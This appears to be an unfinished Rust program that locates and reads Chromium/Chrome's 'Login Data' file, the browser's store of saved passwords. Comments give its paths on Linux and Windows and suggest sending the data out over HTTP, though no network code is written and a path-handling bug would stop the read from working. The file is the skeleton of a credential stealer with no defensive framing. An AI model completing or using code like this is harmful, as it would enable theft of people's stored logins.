// Folder on Linux with snap: snap/chromium/common/chromium/Default/Login\ Data
// Windows: APPDATA + "\..\Local\Google\Chrome\User Data\Default\Login Data"

use std::path::Path;
use std::fs::File;
use std::io::Read;
//use std::env;
//use std::fs;

fn read_file(mut filename: String) -> Vec<u8> {
    filename = filename.replace("/", "");

    let path = Path::new(&filename);
    if !path.exists() {
        return String::from("Not Found!").into();
    }

    let mut file_content = Vec::new();
    let mut file = File::open(&filename).expect("Unable to open file");
    file.read_to_end(&mut file_content).expect("Unable to read");

    file_content
}

fn main() {
    let filename = "/home/six/snap/chromium/common/chromium/Default/Login Data";
    println!(">> Filename: {}", filename);

    let mut output = read_file(filename.to_string());

    //println!(">> Data: {}", output.to_string()); convert from Vec
    // or send a http request with the data - https://stackoverflow.com/questions/14154753/how-do-i-make-an-http-request-from-rust#14189088

    //let contents = fs::read_to_string(filename)
    //    .expect("Something went wrong reading the file");

}
